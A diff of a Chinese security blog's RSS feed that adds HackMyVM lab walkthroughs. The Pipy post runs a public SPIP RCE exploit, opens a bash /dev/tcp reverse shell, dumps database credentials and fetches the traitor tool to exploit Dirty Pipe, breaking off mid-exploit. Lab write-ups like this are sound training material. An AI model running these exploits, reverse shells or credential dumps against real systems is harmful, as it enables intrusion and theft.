@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umph.top/image/202506121404919.webp</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Tue, 12 Aug 2025 16:30:11 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>Challenge 052</title><link>https://7r1UMPH.github.io/post/Challenge%20052.html</link><description>![image-20250622182158981](https://7r1umph.top/image/20250622182159297.webp)
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umph.top/image/202506121404919.webp</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Wed, 13 Aug 2025 16:25:42 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>Challenge 052</title><link>https://7r1UMPH.github.io/post/Challenge%20052.html</link><description>![image-20250622182158981](https://7r1umph.top/image/20250622182159297.webp)
 
 下载
 
@@ -5354,7 +5354,4087 @@ if ($choice == 1) {
 ?&gt;
 ```
 
-加密和解密模块（解密模块是乱码，建议不用，或者自己改）。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Wave.html</guid><pubDate>Thu, 20 Mar 2025 08:24:13 +0000</pubDate></item><item><title>hmv_uvalde</title><link>https://7r1UMPH.github.io/post/hmv_uvalde.html</link><description># 0.简介
+加密和解密模块（解密模块是乱码，建议不用，或者自己改）。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Wave.html</guid><pubDate>Thu, 20 Mar 2025 08:24:13 +0000</pubDate></item><item><title>hmv_qweasd</title><link>https://7r1UMPH.github.io/post/hmv_qweasd.html</link><description># hmv_qweasd
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
+**难度**：黄色
+**目标 IP**：192.168.205.217
+**本机** IP：192.168.205.141
+
+---
+
+## **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
+Nmap scan report for 192.168.205.217
+Host is up (0.00040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Jetty 10.0.18
+MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
+                                                                 
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_qweasd.html</guid><pubDate>Thu, 20 Mar 2025 08:21:08 +0000</pubDate></item><item><title>hmv_publisher</title><link>https://7r1UMPH.github.io/post/hmv_publisher.html</link><description># hmv_publisher
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
+**难度**：绿色
+**目标 IP**：192.168.205.211
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
+Nmap scan report for 192.168.205.211
+Host is up (0.0012s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_publisher.html</guid><pubDate>Thu, 20 Mar 2025 08:20:06 +0000</pubDate></item><item><title>hmv_Principle2</title><link>https://7r1UMPH.github.io/post/hmv_Principle2.html</link><description># hmv_Principle2
+
+# 0.简介
+
+**靶机**：[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
+**难度**：黄色
+**目标 IP**：192.168.205.247
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
+Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
+Host is up (0.00075s latency).
+Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+35659/tcp open  unknown
+42607/tcp open  unknown
+43239/tcp open  unknown
+43401/tcp open  unknown
+46365/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+                                                                   
+```
+
+其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子
+
+---
+
+# 2.踩点
+
+## prot 445
+
+ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient //192.168.205.247/public
+Password for [WORKGROUP\kali]:
+Try 'help' to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Nov 28 19:57:45 2023
+  ..                                  D        0  Sun Nov 26 00:19:40 2023
+  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
+  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
+  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023
+
+                19962704 blocks of size 1024. 17182940 blocks available
+smb: \&gt; get new_era.txt
+getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
+smb: \&gt; get straton.txt
+getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
+smb: \&gt; get loyalty.txt
+getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
+smb: \&gt; exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat new_era.txt                   
+Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat straton.txt
+This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.
+
+AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
+STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat loyalty.txt
+This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).
+
+What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.
+
+2257686f2061726520796f752c207468656e3f22
+
+To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
+                                                                                                                                     
+
+# new_era.txt翻译
+昨天发生了重大变化，新政府，新市长。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Principle2.html</guid><pubDate>Thu, 20 Mar 2025 08:19:04 +0000</pubDate></item><item><title>hmv_Pipy</title><link>https://7r1UMPH.github.io/post/hmv_Pipy.html</link><description># hmv_Pipy
+
+# 0.简介
+
+**靶机**：[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
+Nmap scan report for tiny.hmv (192.168.205.143)
+Host is up (0.00031s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)
+
+扫描有没有漏洞（不得不说，群里面的web大佬**Anjv-W.**  推荐的扫洞工具就是好用，点赞👍）
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nuclei -u http://192.168.205.143               
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.3.8
+
+                projectdiscovery.io
+
+[INF] Current nuclei version: v3.3.8 (latest)
+[INF] Current nuclei-templates version: v10.1.1 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 154
+[INF] Templates loaded for current scan: 7607
+[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 182 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 1702 (Reduced 1602 Requests)
+[INF] Using Interactsh Server: oast.online
+[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&amp;lang=fr
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.143
+[openssh-detect] [tcp] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
+[ssh-password-auth] [javascript] [info] 192.168.205.143:22
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
+[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ['['publickey','password']']
+[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ['Vulnerable to Terrapin']
+[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
+[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
+[metatag-cms] [http] [info] http://192.168.205.143 ['SPIP 4.2.0']
+[readme-md] [http] [info] http://192.168.205.143/README.md
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
+[apache-detect] [http] [info] http://192.168.205.143 ['Apache/2.4.52 (Ubuntu)']
+[spip-detect:spip_version] [http] [info] http://192.168.205.143 ['4.2.0']
+[configuration-listing] [http] [medium] http://192.168.205.143/config/
+```
+
+有一个[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)漏洞，我们利用一下
+
+![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)
+
+非授权远程执行更喜欢了🤩
+
+```bash
+git clone https://github.com/Chocapikk/CVE-2024-8517.git
+cd CVE-2024-8517
+python3 -m venv env
+source env/bin/activate
+pip install -r requirements.txt 
+┌──(env)─(kali㉿kali)-[~/test/tmp/CVE-2024-8517]
+└─$ python3 exploit.py -u http://192.168.205.143          
+✅ Target is vulnerable! Command Output: www-data
+                                                                                                                                     
+ℹ  Interactive shell started. Type `exit` to quit.
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+deactivate #退出虚拟环境命令
+rm -rf env #删除虚拟环境
+```
+
+成功，但是我们要弹个**反弹shell**回去，因为它这个脚本的shell有限制
+
+```bash
+$ bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
+```
+
+# 3. 获得稳定的 Shell
+
+获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```bash
+www-data@pipy:/var/www/html$ sudo -l
+[sudo] password for www-data: 
+sudo: a password is required
+www-data@pipy:/var/www/html$ ls -la
+total 156
+drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .
+drwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..
+-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md
+drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG
+-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE
+-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md
+-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md
+-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json
+-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock
+drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config
+drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire
+-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt
+-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php
+drwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local
+drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist
+-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json
+drwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive
+-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php
+-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png
+-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg
+drwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist
+drwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp
+drwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor
+www-data@pipy:/var/www/html$ cd config/
+www-data@pipy:/var/www/html/config$ ls -al
+total 48
+drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
+drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
+-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
+-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
+-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
+-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
+-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
+-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
+-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
+www-data@pipy:/var/www/html/config$ cat connect.php
+&lt;?php
+if (!defined('_ECRIRE_INC_VERSION')) return;
+defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
+$GLOBALS['spip_connect_version'] = 0.8;
+spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
+www-data@pipy:/var/www/html/config$ mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 503
+Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]&gt; use spip;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [spip]&gt; show tables;
++-------------------------+
+| Tables_in_spip          |
++-------------------------+
+| spip_articles           |
+| spip_auteurs            |
+| spip_auteurs_liens      |
+| spip_depots             |
+| spip_depots_plugins     |
+| spip_documents          |
+| spip_documents_liens    |
+| spip_forum              |
+| spip_groupes_mots       |
+| spip_jobs               |
+| spip_jobs_liens         |
+| spip_meta               |
+| spip_mots               |
+| spip_mots_liens         |
+| spip_paquets            |
+| spip_plugins            |
+| spip_referers           |
+| spip_referers_articles  |
+| spip_resultats          |
+| spip_rubriques          |
+| spip_syndic             |
+| spip_syndic_articles    |
+| spip_types_documents    |
+| spip_urls               |
+| spip_versions           |
+| spip_versions_fragments |
+| spip_visites            |
+| spip_visites_articles   |
++-------------------------+
+28 rows in set (0.000 sec)
+
+MariaDB [spip]&gt; select * from spip_auteurs\G
+*************************** 1. row ***************************
+   id_auteur: 1
+         nom: Angela
+         bio: 
+       email: angela@pipy.htb
+    nom_site: 
+    url_site: 
+       login: angela
+        pass: 4ng3l4
+     low_sec: 
+      statut: 0minirezo
+   webmestre: oui
+         maj: 2023-10-04 17:28:39
+         pgp: 
+      htpass: 
+    en_ligne: 2023-10-04 13:50:34
+ alea_actuel: 387046876651c39a45bc836.13502903
+  alea_futur: 465278670651d6da4349d85.01841245
+       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
+cookie_oubli: NULL
+      source: spip
+        lang: 
+    imessage: 
+ backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=
+*************************** 2. row ***************************
+   id_auteur: 2
+         nom: admin
+         bio: 
+       email: admin@pipy.htb
+    nom_site: 
+    url_site: 
+       login: admin
+        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2
+     low_sec: 
+      statut: 1comite
+   webmestre: non
+         maj: 2023-10-04 17:31:03
+         pgp: 
+      htpass: 
+    en_ligne: 2023-10-04 17:31:03
+ alea_actuel: 1540227024651d7e881c21a5.84797952
+  alea_futur: 439334464651da1526dbb90.67439545
+       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
+cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
+      source: spip
+        lang: fr
+    imessage: oui
+ backup_cles: 
+2 rows in set (0.000 sec)
+```
+
+切换至`angela`
+
+```bash
+www-data@pipy:/var/www/html/config$ su - angela
+Password: 
+angela@pipy:~$ id
+uid=1000(angela) gid=1000(angela) groups=1000(angela)
+```
+
+继续提权
+
+```bash
+angela@pipy:~$ ls -la
+total 40
+drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
+drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
+lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
+drwx------ 3 angela angela 4096 Oct  5  2023 .cache
+drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
+-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
+drwx------ 3 angela angela 4096 Oct  3  2023 snap
+drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
+-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
+-rw------- 1 angela angela   33 Oct  5  2023 user.txt
+angela@pipy:~$ cd /opt/
+angela@pipy:/opt$ ls -al
+total 8
+drwxr-xr-x  2 root root 4096 Aug 10  2023 .
+drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
+angela@pipy:/opt$ cd /tmp/
+angela@pipy:/tmp$ ls -al
+total 12
+drwxrwxrwt  2 root     root     4096 Jan 18 02:44 .
+drwxr-xr-x 19 root     root     4096 Oct  2  2023 ..
+-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q
+angela@pipy:/tmp$ cd /mnt/
+angela@pipy:/mnt$ ls -la
+total 8
+drwxr-xr-x  2 root root 4096 Aug 10  2023 .
+drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
+angela@pipy:/mnt$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/fusermount3
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/pkexec
+/snap/snapd/23545/usr/lib/snapd/snap-confine
+/snap/snapd/20092/usr/lib/snapd/snap-confine
+/snap/core20/2434/usr/bin/chfn
+/snap/core20/2434/usr/bin/chsh
+/snap/core20/2434/usr/bin/gpasswd
+/snap/core20/2434/usr/bin/mount
+/snap/core20/2434/usr/bin/newgrp
+/snap/core20/2434/usr/bin/passwd
+/snap/core20/2434/usr/bin/su
+/snap/core20/2434/usr/bin/sudo
+/snap/core20/2434/usr/bin/umount
+/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2434/usr/lib/openssh/ssh-keysign
+/snap/core20/2015/usr/bin/chfn
+/snap/core20/2015/usr/bin/chsh
+/snap/core20/2015/usr/bin/gpasswd
+/snap/core20/2015/usr/bin/mount
+/snap/core20/2015/usr/bin/newgrp
+/snap/core20/2015/usr/bin/passwd
+/snap/core20/2015/usr/bin/su
+/snap/core20/2015/usr/bin/sudo
+/snap/core20/2015/usr/bin/umount
+/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2015/usr/lib/openssh/ssh-keysign
+/snap/core/17200/bin/mount
+/snap/core/17200/bin/ping
+/snap/core/17200/bin/ping6
+/snap/core/17200/bin/su
+/snap/core/17200/bin/umount
+/snap/core/17200/usr/bin/chfn
+/snap/core/17200/usr/bin/chsh
+/snap/core/17200/usr/bin/gpasswd
+/snap/core/17200/usr/bin/newgrp
+/snap/core/17200/usr/bin/passwd
+/snap/core/17200/usr/bin/sudo
+/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/17200/usr/lib/openssh/ssh-keysign
+/snap/core/17200/usr/lib/snapd/snap-confine
+/snap/core/17200/usr/sbin/pppd
+/snap/core/16202/bin/mount
+/snap/core/16202/bin/ping
+/snap/core/16202/bin/ping6
+/snap/core/16202/bin/su
+/snap/core/16202/bin/umount
+/snap/core/16202/usr/bin/chfn
+/snap/core/16202/usr/bin/chsh
+/snap/core/16202/usr/bin/gpasswd
+/snap/core/16202/usr/bin/newgrp
+/snap/core/16202/usr/bin/passwd
+/snap/core/16202/usr/bin/sudo
+/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/16202/usr/lib/openssh/ssh-keysign
+/snap/core/16202/usr/lib/snapd/snap-confine
+/snap/core/16202/usr/sbin/pppd
+angela@pipy:/mnt$ /sbin/getcap -r / 2&gt;/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+/snap/core20/2434/usr/bin/ping cap_net_raw=ep
+/snap/core20/2015/usr/bin/ping cap_net_raw=ep
+angela@pipy:/mnt$ ss -tuln | grep tcp
+tcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        
+tcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        
+tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        
+tcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        
+tcp   LISTEN 0      511                         *:80              *:*        
+tcp   LISTEN 0      128                      [::]:22           [::]:*        
+angela@pipy:/mnt$ nc
+nc          nc.openbsd  
+angela@pipy:/mnt$ nc 127.0.0.1 4226
+a
+hello
+root
+angela@pipy:/mnt$ ls
+angela@pipy:/mnt$ nc 127.0.0.1 4226
+root
+admin
+```
+
+什么都没找到,还没定时任务，不会是**内核提权**吧，尝试一下可不可以使用自动化工具提权
+
+```bash
+angela@pipy:/mnt$ cd /tmp/
+angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
+--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
+Connecting to 192.168.205.141:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8475976 (8.1M) [application/octet-stream]
+Saving to: ‘traitor-386’
+
+traitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================&gt;]   8.08M  --.-KB/s    in 0.03s   
+
+2025-01-18 02:52:07 (282 MB/s) - ‘traitor-386’ saved [8475976/8475976]
+
+angela@pipy:/tmp$ chmod +x traitor-386 
+angela@pipy:/tmp$ ./traitor-386 -a
+
+                                                                                                                                     
+▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                            
+░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                    
+https://github.com/liamg/traitor                                                                                                     
+                                                                                                                                     
+[+] Assessing machine state...                                                                                                       
+[+] Checking for opportunities...
+[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
+[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...
+[+][kernel:CVE-2022-0847] Attempting to set root password...
+[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
+[+][kernel:CVE-2022-0847] Creating pipe...
+[+][kernel:CVE-2022-0847] Determining pipe size...
+[+][kernel:CVE-2022-0847] Pipe size is 65536.
+[+][kernel:CVE-2022-0847] Filling pipe...
+[+][kernel:CVE-2022-0847] Draining pipe...
+[+][kernel:CVE-2022-0847] Pipe drained.
+[+][kernel:CVE-2022-0847] Splicing data...
+[+][kernel:CVE-2022-0847] Writing to dirty pipe...
+[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
+[+][kernel:CVE-2022-0847] Starting shell...
+[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.
+[+][kernel:CVE-2022-0847] Setting up tty...
+[+][kernel:CVE-2022-0847] Attempting authentication as root...
